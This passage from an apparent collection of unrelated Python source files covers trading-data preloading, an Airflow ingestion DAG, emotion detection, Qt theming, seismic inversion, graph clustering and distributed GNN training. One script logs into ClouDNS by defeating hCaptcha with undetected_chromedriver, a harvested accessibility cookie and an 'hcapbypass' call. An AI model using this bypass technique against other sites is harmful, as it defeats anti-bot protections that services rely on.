klines['low'].append(float(item[3]))\n        klines['close'].append(float(item[4]))\n        klines['volume'].append(float(item[5]))\n        klines['turnover'].append(float(item[6]))\n        \n    # Reverse the items in the lists of the dictionary klines (thank you Bybit!)\n    for key in klines:\n        klines[key].reverse()\n        \n    # Output to stdout\n    print(defs.now_utc()[1] + \"Preload: get_klines: Initial klines with interval \" + str(interval) + \"m loaded!\\n\")\n    \n    if debug:\n        print(defs.now_utc()[1] + \"Preload: get_klines: Prefilled klines with interval \" + str(interval) + \"m\")\n        print(defs.now_utc()[1] + \"Time : \" + str(klines['time']))\n        print(defs.now_utc()[1] + \"Open : \" + str(klines['open']))\n        print(defs.now_utc()[1] + \"High : \" + str(klines['high']))\n        print(defs.now_utc()[1] + \"Low  : \" + str(klines['low']))\n        print(defs.now_utc()[1] + \"Close: \" + str(klines['close']))\n    \n    # return klines\n    return klines\n\n# Preload prices\ndef get_prices(symbol, limit):\n    \n    # Debug\n    debug = False\n    \n    # Initialize prices\n    prices = {}\n\n    # Get kline with the lowest interval (1 minute)\n    kline_prices = get_klines(symbol, 1, limit)\n    prices       = {\n        'time' : kline_prices['time'],\n        'price': kline_prices['close']\n    }\n\n    # Return prices\n    return prices\n\n# Preload instrument info\ndef get_info(symbol, spot, multiplier):\n\n    # Debug\n    debug = False\n\n    # Initialize info\n    info   = {'time': 0, 'symbol': '', 'baseCoin': '', 'quoteCoin': '', 'status': '', 'basePrecision': 0, 'quotePrecision': 0, 'minOrderQty': 0, 'maxOrderQty': 0, 'minOrderAmt': 0, 'maxOrderAmt': 0, 'tickSize': 0} \n\n    # Load instrument info via normal session\n    message = defs.now_utc()[1] + \"Orders: get_info: session: get_instruments_info\\n\"\n    print(message)\n    pre_info = {}\n    try:\n        pre_info = session.get_instruments_info(\n            category = \"spot\",\n            symbol   = symbol\n        )\n    ",
    "from datetime import datetime, timedelta\nfrom airflow import DAG\nfrom airflow.operators.bash_operator import BashOperator\nfrom airflow.providers.google.cloud.transfers.local_to_gcs import LocalFilesystemToGCSOperator\nfrom airflow.operators.dagrun_operator import TriggerDagRunOperator\nimport os\n\n# Define the default arguments for the DAG\ndefault_args = {\n    'owner': 'airflow',\n    'depends_on_past': False,\n    'email_on_failure': False,\n    'email_on_retry': False,\n    'retries': 1,\n    'retry_delay': timedelta(minutes=5),\n}\n\n# Define the DAG\nwith DAG(\n    'ingest_to_datalake',\n    default_args=default_args,\n    description='A DAG to upload CSV files from a local directory to GCS',\n    schedule_interval='@once',  # Run once as soon as possible\n    start_date=datetime.now(),\n    is_paused_upon_creation=False,\n    tags=['data_engineering', 'ingestion', 'data_lake', 'extract'],\n) as dag:\n    # Define the BashOperator to execute curl command to download the file\n    download_task = BashOperator(\n        task_id='execute_download_task',\n        bash_command='curl -o /opt/airflow/data/2024_linkedin_scraped_data.zip https://storage.googleapis.com/project-raw-data/2024_linkedin_scraped_data.zip'\n    )\n\n    # Define the BashOperator to execute unzip command to unzip the file\n    unzip_task = BashOperator(\n        task_id='execute_unzip_task',\n        bash_command='unzip -o /opt/airflow/data/2024_linkedin_scraped_data.zip -d /opt/airflow/data/'\n    )\n\n    # Define the LocalFilesystemToGCSOperator to upload the CSVs to the datalake\n    upload_task = LocalFilesystemToGCSOperator(\n        task_id='upload_job_to_gcs',\n        bucket=os.environ.get(\"BUCKET_NAME\"),\n        src=\"/opt/airflow/data/*.csv\",  # Upload all CSV files in the directory\n        dst=\"data/\"  # Destination directory in GCS\n    )\n\n    # Define the TriggerDagRunOperator to trigger the transform DAG\n    trigger_transform_dag_task = TriggerDagRunOperator(\n        task_id = 'trigger_transform_dag_task',\n        trigger_dag_id = 'transform_data_with_spark'\n    )\n\n    # Set the task dependencies\n    download_task >> unzip_task >> upload_task >> trigger_transform_dag_task\n",
    "from tensorflow.keras.models import model_from_json\nimport numpy as np\nimport cv2\nimport math\nfrom tensorflow.keras.preprocessing import image\nfacec = cv2.CascadeClassifier('haarcascade_frontalface_default.xml')\nimport os\nimport shutil\nfrom skimage.metrics import structural_similarity\n\nwith open(\"model.json\", \"r\") as json_file:   #Loading the saved model\n    loaded_model_json = json_file.read()\n    loaded_model = model_from_json(loaded_model_json)\n\nloaded_model.load_weights(\"model.h5\")\nloaded_model.make_predict_function()\n\ndef pred(img_path):  \n    label_to_text = {0:\"Neutral\",1:\"Disgusted\",2:\"Fearful\",3:\"Happy\",4:\"Sad\",5:\"Surprised\",6:\"Neutral\"}  \n    img=cv2.imread(img_path)\t\t\t\t\t\t\t\t\t#read Image\n    gray_fr = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)\t\t\t\t#covert image to grayscale\n    faces_rects = facec.detectMultiScale(gray_fr, scaleFactor = 1.2, minNeighbors = 5)  #opencv's cascade classifier will be used for detecting the face\n    if len(faces_rects)!=0:\n        for (x, y, w, h) in faces_rects:\n            fc = gray_fr[y:y+h, x:x+w]     #extracting only the face part\n        roi = cv2.resize(fc, (48, 48))\t#resizing it according to the image that are acceptable by our model\n        img = image.img_to_array(roi)\n        img = img/255\n        img = np.expand_dims(img, axis=0)\n        return label_to_text[np.argmax(loaded_model.predict(img))],img  #model.predict is used for predicting the emotion\n    else:\n        return 0,0  #return 0 if the face is not found\n\ndef removeout():\n    shutil.rmtree('output/')  #remove output folder\n    \ndef vidframe(vidname):\n\tif vidname==0:\n\t\tcap = cv2.VideoCapture(0)\n\t\t# Define the codec and create VideoWriter object\n\t\tfourcc = cv2.VideoWriter_fourcc(*'XVID')\n\t\tout = cv2.VideoWriter('output.mp4',fourcc, 20.0, (640,480))\n\n\t\twhile(cap.isOpened()):\n\t\t\tret, frame = cap.read()\n\t\t\tif ret==True:\n\t\t\t\tout.write(frame)\n\t\t\t\tcv2.imshow('frame',frame)\n\t\t\t\tif cv2.waitKey(1) & 0xFF == ord('q'):\n\t\t\t\t\tbreak\n\t\t\telse:\n\t\t\t\tbreak\n\n\t\t# Release everything if job is finished\n\t\tcap.release()\n\t\tout.release()\n\t\tcv2.destroyAllWindows()\n\t\tvidname=\"output.mp4\"\n\n\tif os.path.exists('output'):      #if output folder is present then delete it\n\t\tremoveout()\t\t\t\t\t\t#create Output folder for storing frame\n\tos.mkdir('output')\n\tcap = cv2.VideoCapture(vidname)\t\t\t#capture  video\n\tframeRate=cap.get(5)\t\t\t\t\t\n\tcount = 0\n\twhile(cap.isOpened()):\t\t\t\t\t#store the frames in output folder\n\t\tframeId = cap.get(1)\n\t\tret, frame = cap.read()\n\t\tif (ret != True):\n\t\t\tbreak\n\t\tif (frameId%10==0):\n\t\t\tfilename =\"output/frame%d.jpg\" % count;count+=1\n\t\t\tcv2.imwrite(filename, frame)\n\tcap.release()\n\tresult=[]\t\t\t\t\t\t\t# used for storing emotion\n\tface=[]\t\t\t\t\t\t\t\t#used for storing face images\n\tfor filename in os.listdir(\"output\"): #loop through each frame\n\t\ta,b = pred(\"output/\"+filename)\n\t\t#print(a,b)  #run pred function to get emotion and face images\n\t\tresult.append(a)\n\t\tface.append(b)\n\t#removeout()\n\tresult=[x for x in result if x!=0]        #removing null prediction\n\tface=[x for x in face if len(str(x))>1]\n\treturn result, face\n\n\ndef ssimscore1(im1,im2):\n    im1=im1.reshape(48, 48, 1).astype('float32')   #reshaping the flattened image array\n    im2=im2.reshape(48, 48, 1).astype('float32')\n    (score, diff) = structural_similarity(im1, im2, full=True,multichannel=True) #comparing the image for finding difference using compare_ssim function \n    return score\n\n\n\n\n\n\n\n\n\n\n",
    "import os\nimport darkdetect\nimport locale\nfrom enum import Enum\nfrom typing import Union, Optional\nfrom ctypes import c_int, byref, windll\nfrom PySide6.QtCore import Qt, QObject, QFile, QRect, QRectF, QSize, QTranslator, Signal, Slot, QPropertyAnimation, QParallelAnimationGroup, QEasingCurve, QUrl\nfrom PySide6.QtGui import QGuiApplication, QColor, QRgba64, QIcon, QIconEngine, QPainter, QFont, QDesktopServices\nfrom PySide6.QtSvg import QSvgRenderer\nfrom PySide6.QtXml import QDomDocument\nfrom PySide6.QtWidgets import *\n\nfrom .Utils import *\nfrom .Sources import *\n\n##############################################################################################################################\n\nclass CustomSignals_ComponentsCustomizer(QObject):\n    '''\n    Set up signals for components\n    '''\n    # Set theme\n    Signal_SetTheme = Signal(str)\n\n    # Set language\n    Signal_SetLanguage = Signal(str)\n    '''\n    # Get clicked button\n    Signal_ClickedButton = Signal(QMessageBox.StandardButton)\n    '''\n\nComponentsSignals = CustomSignals_ComponentsCustomizer()\n\n##############################################################################################################################\n\nclass Theme:\n    '''\n    '''\n    Dark = 'Dark'\n    Light = 'Light'\n\n    Auto = darkdetect.theme()\n\n\nclass ThemeBase:\n    '''\n    '''\n    THEME = Theme.Auto if Theme.Auto is not None else Theme.Dark\n\n    def Update(self, theme: str):\n        if theme in (Theme.Dark, Theme.Light):\n            self.THEME = theme\n\n\nEasyTheme = ThemeBase()\n\n##############################################################################################################################\n\nRegistratedWidgets = {}\n\n\nclass StyleSheetBase(Enum):\n    '''\n    '''\n    Label = 'Label'\n    Button = 'Button'\n    ScrollArea = 'ScrollArea'\n    Tree = 'Tree'\n    ToolBox = 'ToolBox'\n    SpinBox = 'SpinBox'\n    ComboBox = 'ComboBox'\n    Edit = 'Edit'\n    Player = 'Player'\n    Table = 'Table'\n\n    Bar = 'Bar'\n    Window = 'Window'\n    Dialog = 'Dialog'\n\n    def Registrate(self, widget, value):\n        RegistratedWidgets[widget] = value\n\n    def Deregistrate(self, widget):\n        RegistratedWidgets.pop(widget)\n\n    def Apply(self, widget: QWidget, theme: Optional[str] = None, registrate: bool = True):\n        QApplication.processEvents()\n\n        EasyTheme.Update(theme) if theme is not None else None\n\n        Prefix = 'QSS'\n        FilePath = f'QSS/{EasyTheme.THEME}/{self.value}.qss'\n        File = QFile(Path(f':/{Prefix}').joinpath(FilePath))\n        File.open(QFile.ReadOnly | QFile.Text)\n        QSS = str(File.readAll(), encoding = 'utf-8')\n        File.close()\n\n        widget.setStyleSheet(QSS)\n\n        self.Registrate(widget, self.value) if registrate else None\n\n\ndef Function_UpdateStyleSheet(\n    theme: Optional[str] = None\n):\n    '''\n    '''\n    for Widget, value in list(RegistratedWidgets.items()):\n        for Value in StyleSheetBase:\n            if Value.value != value:\n                continue\n            try:\n                Value.Apply(Widget, theme)\n            except RuntimeError:\n                Value.Deregistrate(Widget)\n            finally:\n                continue\n\n\nComponentsSignals.Signal_SetTheme.connect(Function_UpdateStyleSheet)\n\n##############################################################################################################################\n\nclass IconEngine(QIconEngine):\n    '''\n    '''\n    def __init__(self):\n        super().__init__()\n\n        self.IsIconSVG = False\n\n    def loadSVG(self, SVGString: str):\n        self.IsIconSVG = True\n        self.Icon = SVGString.encode(errors = 'replace')\n\n    def paint(self, painter: QPainter, rect: QRect, mode: QIcon.Mode, state: QIcon.State) -> None:\n        if self.IsIconSVG:\n            renderer = QSvgRenderer(self.Icon)\n            renderer.render(painter, QRectF(rect))\n        else:\n            super().paint(painter, rect, mode, state)\n\n\nclass IconBase(Enum):\n    '''\n    '''\n    Ellipsis = 'Ellipsis'\n    OpenedFolder = 'OpenedFolder'\n    Play = 'Play'\n    Pause = 'Pause'\n    Dash = 'Dash'\n    FullScreen = 'FullScreen'\n    X = 'X'\n\n    def paint(self, painter: QPainter, rect: Union[QRect, QRectF], theme: Optional[str] = None):\n        Prefix = 'Icons'\n        IconPath = f'Icons/{theme if theme is not None else EasyTheme.THEME}/{self.value}.svg'\n        IconPath = Path(f':/{Prefix}').joinpath(IconPath).as_posix()\n        Renderer = QSvgRenderer(IconPath)\n        Renderer.render(painter, QRectF(rect))\n\n    def create(self, theme: Optional[str] = None) -> QIcon:\n        Prefix = 'Icons'\n        IconPath = f'Icons/{theme if theme is not None else EasyTheme.THEME}/{self.value}.svg'\n        File = QFile(Path(f':/{Prefix}').joinpath(IconPath))\n        File.open(QFile.ReadOnly)\n        DomDocument = QDomDocument()\n        DomDocument.setContent(File.readAll())\n        File.close()\n\n        Engine = IconEngine()\n        Engine.loadSVG(DomDocument.toString())\n        Icon = QIcon(Engine)\n\n        return Icon\n",
    "\"\"\"\n@author: Chao Song\n\"\"\"\n\nimport tensorflow as tf\nimport numpy as np\nimport time\nimport cmath\nimport scipy.io\n\nnp.random.seed(1234)\ntf.set_random_seed(1234)\n\nmisfit = []\nmisfit1 = []\n\ndef fwd_gradients(Y, x):\n    dummy = tf.ones_like(Y)\n    G = tf.gradients(Y, x, grad_ys=dummy, colocate_gradients_with_ops=True)[0]\n    Y_x = tf.gradients(G, dummy, colocate_gradients_with_ops=True)[0]\n    return Y_x\n\n####### Class for velocity inversion\nclass Velocityinversion:\n    # Initialize the class\n    def __init__(self, x, z, u0, du, du_xx, du_zz, m0, layers, omega):\n        \n        X = np.concatenate([x, z], 1)\n        \n        self.lb = X.min(0)\n        self.ub = X.max(0)\n                \n        self.X = X\n\n        self.x = X[:,0:1]\n        self.z = X[:,1:2]\n        \n        self.u0 = u0\n        self.du = du\n        self.du_xx = du_xx\n        self.du_zz = du_zz\n        self.m0 = m0\n\n        self.omega = omega\n        self.layers = layers\n        \n        # Initialize NN\n        self.weights, self.biases = self.initialize_NN(layers)  \n\n        # tf placeholders \n        self.sess = tf.Session(config=tf.ConfigProto(allow_soft_placement=True,\n                                                     log_device_placement=True))\n\n        self.x_tf = tf.placeholder(tf.float32, shape=[None, self.x.shape[1]])\n        self.z_tf = tf.placeholder(tf.float32, shape=[None, self.z.shape[1]])\n\n        self.m_pred, self.f_loss = self.net_NS(self.x_tf, self.z_tf)\n\n        # loss function we define\n       \n        self.loss = tf.reduce_sum(tf.square(tf.abs(self.f_loss)))\n        \n        # optimizer used by default (in original paper)        \n            \n        self.optimizer = tf.contrib.opt.ScipyOptimizerInterface(self.loss, \n                                                                method = 'L-BFGS-B', \n                                                                options = {'maxiter': 50000,\n                                                                           'maxfun': 50000,\n                                                                           'maxcor': 50,\n                                                                           'maxls': 50,\n                                                                           'ftol' : 1.0 * np.finfo(float).eps})        \n        \n        self.optimizer_Adam = tf.train.AdamOptimizer()\n        self.train_op_Adam = self.optimizer_Adam.minimize(self.loss)                    \n        \n        init = tf.global_variables_initializer()\n        self.sess.run(init)\n\n    def initialize_NN(self, layers):        \n        weights = []\n        biases = []\n        num_layers = len(layers) \n        for l in range(0,num_layers-1):\n            W = self.xavier_init(size=[layers[l], layers[l+1]])\n            b = tf.Variable(tf.zeros([1,layers[l+1]], dtype=tf.float32)+0.0, dtype=tf.float32)\n            weights.append(W)\n            biases.append(b)        \n        return weights, biases\n        \n    def xavier_init(self, size):\n        in_dim = size[0]\n        out_dim = size[1]        \n        xavier_stddev = np.sqrt(2/(in_dim + out_dim))\n        return tf.Variable(tf.truncated_normal([in_dim, out_dim], stddev=xavier_stddev), dtype=tf.float32)\n    \n    def neural_net(self, X, weights, biases):\n        num_layers = len(weights) + 1\n        \n        H = 2.0*(X - self.lb)/(self.ub - self.lb) - 1.0\n        for l in range(0,num_layers-2):\n            W = weights[l]\n            b = biases[l]\n        #    H = tf.nn.relu(tf.add(tf.matmul(H, W), b))\n            H = tf.atan(tf.add(tf.matmul(H, W), b))\n        W = weights[-1]\n        b = biases[-1]\n        Y = tf.add(tf.matmul(H, W), b)\n        return Y\n\n    def net_NS(self, x, z):\n\n        omega = self.omega\n        m0 = self.m0\n\n        u0 = self.u0\n        du = self.du\n        du_xx = self.du_xx\n        du_zz = self.du_zz\n      \n        m = self.neural_net(tf.concat([x,z], 1), self.weights, self.biases)\n  \n       # m_x = fwd_gradients(m, x)\n       # m_z = fwd_gradients(m, z)\n\n        #f_loss =  omega*omega*m*du + du_xx + du_zz + omega*omega*(m-m0)*u0 + 0.1*(m_x**2+m_z**2)**0.5 \n        f_loss =  omega*omega*m*du + du_xx + du_zz + omega*omega*(m-m0)*u0 \n\n        return m, f_loss       \n    \n    def callback(self, loss):\n        print('Loss: %.3e' % (loss))      \n        misfit1.append(loss)\n        scipy.io.savemat('misfit1_v.mat',{'misfit1':misfit1})\n\n    def train(self, nIter): \n\n        tf_dict = {self.x_tf: self.x, self.z_tf: self.z}\n        \n        start_time = time.time()\n        for it in range(nIter):\n            self.sess.run(self.train_op_Adam, tf_dict)\n            loss_value = self.sess.run(self.loss, tf_dict)\n            misfit.append(loss_value)         \n            # Print\n            if it % 10 == 0:\n                elapsed = time.time() - start_time\n                loss_value = self.sess.run(self.loss, tf_dict)\n                print('It: %d, Loss: %.3e,Time: %.2f' % \n                      (it, loss_value, elapsed))\n                st",
    "import random\nimport networkx as nx\nimport matplotlib.pyplot as plt\nimport numpy as np\nfrom scipy.spatial import ConvexHull\n\ndef reduce_w(weights, n):\n    tw = []\n    for i, v in enumerate(weights):\n        tw.append(round((n-sum(tw))*(v/sum(weights[i:]))))\n    return tw\n\ndef group_weight(model, coords, nodes, weights, disp=False):\n    clusters = model.labels_\n    n_clusters = model.n_clusters_\n    if sum(weights) != n_clusters: weights = reduce_w(weights, n_clusters)\n    tg_m = {i: {\n        'xy': center([xy for k, xy in enumerate(coords.values()) if clusters[k]==i]), \n        'in': set([n for ii, n in enumerate(nodes) if clusters[ii]==i]),\n        } for i in set(clusters)}\n    tg = tg_m.copy()\n    group = {i: {'in': set(), 'xy': [-1, -1], 'inc': set()} for i in range(len(weights))}\n    for i, v in enumerate(weights):\n        if v > 0:\n            if len(tg) > 3:\n                ttf = {index: [tg_m[index]['xy'][0], tg_m[index]['xy'][1]] for index in tg}\n                hull = ConvexHull(list(ttf.values()))\n                ttg_key = random.choice([list(ttf.keys())[index] for index in hull.vertices])\n            else:\n                ttg_key = random.choice(list(tg.keys()))\n            ttg_val = tg.pop(ttg_key)\n            group[i]['in'].update(ttg_val['in'])\n            group[i]['xy'] = ttg_val['xy']\n            group[i]['inc'].add(ttg_key)\n            tg_m[ttg_key]['par'] = i\n            for _ in range(v-1):\n                key = sort_closest(ttg_val, tg)[0]\n                group[i]['in'].update(tg.pop(key)['in'])\n                group[i]['inc'].add(key)\n                tg_m[key]['par'] = i\n    labels = [g for n in nodes for g in group if n in group[g]['in']]\n    if disp:\n        print(n_clusters, weights)\n        print({k: len(v['in']) for k, v in group.items()})\n        print({k: v['xy'] for k, v in group.items()})\n\n        print(\"display\")\n        cds = {k: v['xy'] for k, v in tg_m.items()}\n        cls = [v['par'] for k, v in tg_m.items()]\n        draw_hull(cds, cls)\n        plot_g(group)\n        \n        draw_hull(coords, clusters)\n        plot_g(group)\n                \n        draw_hull(coords, labels)\n        plot_g(group)\n\n    return labels\n\ndef draw_hull(coords: dict, labels):\n    x, y = np.array([x[0] for x in coords.values()]), np.array([x[1] for x in coords.values()])\n    for corners in [[i for i in filter(lambda a: c == labels[a], range(len(labels)))] for c in set(labels)]:\n        if len(corners) > 3:\n            ttf = ([[x[i], y[i]] for i in corners])\n            hull = ConvexHull(ttf)\n            plt.fill([ttf[x1][0] for x1 in hull.vertices], [ttf[y1][1] for y1 in hull.vertices], alpha=0.25, facecolor='grey', edgecolor='black', linewidth=3)\n        else:\n            plt.fill(x[corners], y[corners], alpha=0.25, facecolor='grey', edgecolor='black', linewidth=3)\n    plt.scatter(x, y, c=labels)\n\ndef distance(a, b, cyl=False, width=5632):\n    if cyl: return (min(abs(a[1] - b[1]), width - abs(a[1] - b[1])))**2 + (a[0] - b[0])**2\n    return np.sqrt((a[0] - b[0])**2 + (a[1] - b[1])**2)\n\ndef sort_closest(prov: dict, all_provs: dict, sorting = None, cyl=False):\n    if sorting == None: sorting = all_provs.keys()\n    return sorted(sorting, key=lambda p: distance(prov['xy'], all_provs[p]['xy'], cyl=cyl) )# (prov['xy'][0] - all_provs[p]['xy'][0])**2 + (prov['xy'][1] - all_provs[p]['xy'][1])**2)\n\ndef center(xy: list):\n    x = sum(x[0] for x in xy)//len(xy)\n    y = sum(y[1] for y in xy)//len(xy)\n    return [x, y]\n\ndef plot_g(g):\n    if type(g) != nx.Graph:\n        tg = nx.Graph()\n        tg.add_nodes_from([(k, v) for k, v in g.items()])\n        g = tg\n    \n    pos = nx.get_node_attributes(g, \"xy\")\n    nx.draw_networkx(g, pos, font_size=9, alpha=0.7, node_size=200)\n    \n    plt.gca().invert_yaxis()\n    plt.show()",
    "from datetime import datetime\nimport comfy.utils\n\ntime = datetime.now()\n\nclass Chrono_reset:\n    def __init__(self):\n        pass\n    \n    @classmethod\n    def INPUT_TYPES(s):\n        return { \"required\": {\"clip\": (\"CLIP\",), } }\n\n    RETURN_TYPES = (\"CLIP\",)\n    RETURN_NAMES = (\"clip\",)\n\n    FUNCTION = \"reset\"\n    CATEGORY = \"Chrono \u23f1\ufe0f\"\n\n    def reset(self, clip):\n        global time\n        time = datetime.now()\n        return (clip,)\n\nclass Chrono_get:\n    def __init__(self):\n        pass\n    \n    @classmethod\n    def INPUT_TYPES(s):\n        return { \"required\": {\"image\": (\"IMAGE\",), } }\n\n    RETURN_TYPES = (\"IMAGE\",)\n    RETURN_NAMES = (\"image\",)\n\n    FUNCTION = \"get\"\n    CATEGORY = \"Chrono \u23f1\ufe0f\"\n\n    def get(self, image): \n        print(\"\u23f1\ufe0f Time:\", datetime.now() - time)\n        return (image,)\n\nNODE_CLASS_MAPPINGS = {\n    \"Chrono Reset\": Chrono_reset,\n    \"Chrono Get\": Chrono_get\n}\n\nNODE_DISPLAY_NAME_MAPPINGS = {\n    \"Chrono Reset\": \"\u23f1\ufe0f Reset Chrono\",\n    \"Chrono Get\": \"\u2753 Get Chrono\"\n}\n",
    "import undetected_chromedriver as uc\nimport requests\nimport time\nimport json\nimport sys\nimport os\n\nfrom hcapbypass import bypass\nfrom selenium.webdriver import Keys\nfrom selenium.webdriver.common.by import By\n\nsession_id = None\nvalue1 = None\nvalue2 = None\ncf_api_url = None\ncf_headers = None\nrecord_id1 = None\nrecord_id2 = None\nhc_accessibility = None\nzone = None\nsitekey = \"4bbd3fe0-7a04-401a-aac2-519a52d2abe3\"\nuser_agent = \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0\"\n\ndef check_cert_status():\n    global value1, value2, cf_headers, cf_api_url\n    zone = os.getenv('CF_ZONE_ID')\n    token = os.getenv('CF_TOKEN')\n\n    cf_headers = {\n        \"Authorization\": \"Bearer \" + token,\n        \"Content-Type\": \"application/json\"\n    }\n    \n    cf_api_url = \"https://api.cloudflare.com/client/v4/zones/\" + zone + \"/ssl/certificate_packs?status=all\"\n    response = requests.get(cf_api_url, headers=cf_headers)\n\n    data = json.loads(response.text)\n    for item in data[\"result\"]:\n        if item[\"type\"] == \"universal\":\n            status_value = item[\"status\"]\n            if \"active\" in status_value:\n                print(\"\u8bc1\u4e66\u5df2\u7ecf\u7533\u8bf7\u901a\u8fc7\u4e86\uff01\")\n                sys.exit(0)\n            elif \"pending\" in status_value:\n                validation_records = item.get(\"validation_records\", [])\n                txt_values = [record[\"txt_value\"] for record in validation_records]\n                value1, value2 = txt_values\n                return\n\ndef get_hcaptcha_cookie():\n    global hc_accessibility\n    url = os.getenv('HC_LINK')\n    uc_options = uc.ChromeOptions()\n    uc_options.headless = False\n    #uc_options.add_argument(f'--proxy-server=http://127.0.0.1:40000')\n    driver = uc.Chrome(options=uc_options)\n\n    driver.maximize_window()\n    driver.get(url)\n    time.sleep(5)\n    driver.find_element(by=By.XPATH, value=\"/html/body/div[1]/div[2]/div/div/div[3]/button\").click()\n    time.sleep(10)\n    cookies = driver.get_cookies()\n\n    for cookie in cookies:\n        if cookie[\"name\"] == \"hc_accessibility\":\n            hc_accessibility = cookie[\"value\"]\n            break\n\n    if hc_accessibility is None:\n        driver.quit()\n        print(\"\u6ca1\u627e\u5230\u65e0\u969c\u788dcookie\uff0c\u518d\u8bd5\u4e00\u6b21\")\n        time.sleep(10)\n        sys.exit(1)\n\n    driver.quit()\n\ndef cloudns_login():\n    global session_id, sitekey, user_agent, hc_accessibility\n    email = os.getenv('CD_EMAIL')\n    password = os.getenv('CD_PASSWD')\n    url = 'https://www.cloudns.net/ajaxActions.php?action=index'\n\n    captcha = bypass(sitekey, \"www.cloudns.net\", hc_accessibility)\n\n    data = {\n\t    \"type\": \"login2FA\",\n\t    \"mail\": email,\n\t    \"password\": password,\n\t    \"token\": \"\",\n\t    \"captcha\": captcha\n    }\n\n    response = requests.post(url, headers={\"User-Agent\": user_agent}, data=data)\n    print(response.text)\n    if 'Set-Cookie' in response.headers:\n        set_cookie_header = response.headers['Set-Cookie']\n        session_id = set_cookie_header.split('=')[1].split(';')[0]\n\ndef add_records():\n    global session_id, value1, value2, user_agent, zone, record_id1, record_id2\n    zone = os.getenv('CD_ZONE')\n\n    url = \"https://www.cloudns.net/ajaxActions.php?action=records\"\n    cookie = {\"session_id\": session_id}\n\n    data = {\n        \"show\": \"addRecord\",\n        \"zone\": zone,\n        \"recordType\": \"TXT\",\n        \"active\": \"1\",\n        \"settings[host]\": \"_acme-challenge\",\n        \"settings[record]\": value1,\n        \"settings[ttl]\": \"3600\"\n    }\n\n    data2 = {\n        \"show\": \"addRecord\",\n        \"zone\": zone,\n        \"recordType\": \"TXT\",\n        \"active\": \"1\",\n        \"settings[host]\": \"_acme-challenge\",\n        \"settings[record]\": value2,\n        \"settings[ttl]\": \"3600\"\n    }\n    response = requests.post(url, headers={\"User-Agent\": user_agent}, cookies=cookie, data=data)\n    response2 = requests.post(url, headers={\"User-Agent\": user_agent}, cookies=cookie, data=data2)\n\n    data3 = json.loads(response.text)\n    data4 = json.loads(response2.text)\n\n    record_id1 = data3[\"id\"]\n    record_id2 = data4[\"id\"]\n\ndef recheck_cert_status(retry_limit=6, wait_interval=3600):\n    global cf_headers, cf_api_url\n\n    for attempt in range(retry_limit):\n        response = requests.get(cf_api_url, headers=cf_headers)\n        data = json.loads(response.text)\n        for item in data[\"result\"]:\n            if item[\"type\"] == \"universal\":\n                status_value = item[\"status\"]\n                if \"active\" in status_value:\n                    print(\"\u8bc1\u4e66\u5df2\u7ecf\u7533\u8bf7\u901a\u8fc7\u4e86\uff01\")\n                    return\n                elif \"pending\" in status_value:\n                    print(\"\u8bc1\u4e66\u4ecd\u5728\u7b49\u5f85\u9a8c\u8bc1\uff0c\u7b49\u5f8560\u5206\u949f\u2026\u2026\")\n                    time.sleep(wait_interval)\n\ndef delete_records():\n    global session_id, zone, user_agent, record_id1, record_id2\n\n    url = \"https://www.cloudns.net/ajaxActions.php?action=records\"\n    ua = \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0\"\n    cookie = {\"session_id\": session_id}\n\n    data = {\n\t    \"type\": \"deleteRecord\",\n\t    \"zone\": zone,\n\t    \"record_id\": record_id1\n  ",
    "if __name__ == \"__main__\":\n\n    import dgl\n    import torch as th\n    import dgl.function as fn\n    import csv\n\n    \n\n    dgl.distributed.initialize(ip_config='ip_config.txt')\n    th.distributed.init_process_group(backend='nccl')\n    g = dgl.distributed.DistGraph('ogbn-arxiv')\n\n    train_nid = dgl.distributed.node_split(g.ndata['train_mask'])\n    valid_nid = dgl.distributed.node_split(g.ndata['val_mask'])\n    #print('gshape',g.shape)\n    #print('g',g.__dir__)\n    #print('train',train_nid)\n    # g.ndata['hist1']=g.ndata['feat']\n    # g.ndata['hist2']=\n\n    import torch.nn as nn\n    import torch.nn.functional as F\n    import dgl.nn as dglnn\n    import torch.optim as optim\n    from time import time\n\n    import os\n    local_rank = int(os.environ[\"LOCAL_RANK\"])\n    global_rank = int(os.environ[\"RANK\"])\n    gpu_count = th.cuda.device_count()\n    device = th.device(\"cuda:{}\".format(local_rank % gpu_count))\n\n    '''gcn_msg=fn.copy_src(src='h',out='m')\n    gcn_reduce=fn.sum(msg='m',out='h')\n\n    class NodeappleModule(nn.Module):\n        def __init__(self, in_feats, out_feats, activation):\n            super(NodeappleModule, self).__init__()\n            self.fc1 = nn.Linear(in_feats, out_feats)\n            self.activation = activation\n\n        def forward(self, node):\n            h = self.fc1(node.data[\"h\"])\n            if self.activation is not None:\n                h = self.activation(h)\n            return {'h': h}\n    class GCN_Layer(nn.Module):\n        def __init__(self, in_feats, out_feats, activation):\n            super(GCN_Layer, self).__init__()\n            self.applynode=NodeappleModule(self, in_feats, out_feats, activation)\n        def forward(self,g,feature):\n            g.ndata['h']=feature\n            g.updateall(gcn_msg,gcn_reduce)\n            g.apply_nodes(func=applynode)\n            return g.ndata.pop('h')\n    class GCN(nn.module):\n        def __init__(self, in_feats, out_feats, activation, n_layers):\n            pass'''\n    def f_r_select(rn, vb=1):\n        def rte(func):\n            def inner(*args, **kwargs):\n                if (global_rank == rn):\n                    if vb:\n                        print(\"Rank_{} \".format(rn), end='')\n                    func(*args, **kwargs)\n            return inner\n        return rte\n    @ f_r_select(0)\n    def rprint(*args, **kwargs):\n        return print(*args, **kwargs)\n\n    class GCN(nn.Module):\n        def __init__(self, in_feats, n_hidden, n_classes, n_layers):\n            super().__init__()\n            self.n_layers = n_layers\n            self.n_hidden = n_hidden\n            self.n_classes = n_classes\n            self.layers = nn.ModuleList()\n            self.layers.append(dglnn.GraphConv(\n                in_feats, n_hidden, allow_zero_in_degree=True))\n            for i in range(1, n_layers - 1):\n                self.layers.append(dglnn.GraphConv(\n                    n_hidden, n_hidden, allow_zero_in_degree=True))\n            self.layers.append(dglnn.GraphConv(\n                n_hidden, n_classes, allow_zero_in_degree=True))\n\n        def forward(self, blocks, x):\n            for l, (layer, block) in enumerate(zip(self.layers, blocks)):\n                x = layer(block, x)\n                if l != self.n_layers - 1:\n                    x = F.relu(x)\n            return x\n\n        '''def forward(self, blocks, x, epoch):\n            for l, (layer, block) in enumerate(zip(self.layers, blocks)):\n                x = layer(block, x)\n                if l != self.n_layers - 1:\n                    x = F.relu(x)\n                print(x.shape)\n            return x'''\n\n    